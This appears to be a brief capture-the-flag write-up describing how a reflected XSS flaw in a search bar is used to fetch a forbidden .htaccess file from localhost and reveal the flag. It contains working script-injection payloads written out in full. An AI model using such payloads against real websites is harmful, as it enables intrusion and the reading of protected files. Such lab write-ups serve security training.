Basic Enumeration shows `.htaccess` is forbidden to access by normal users.
The "search" bar reflects user input.
Testing with basic XSS payload such as `<script>alert("xxs!")</script>` will show the HTML and JS is reflected on the site.
Craft a JS payload to use XSS to create a request from localhost to access sensitive files:
`<script>fetch('http://localhost:4444/.htaccess', { method: 'GET' }).then(response => response.text()).then(data => { alert(data); });</script>`
The file contents will contain the flag!
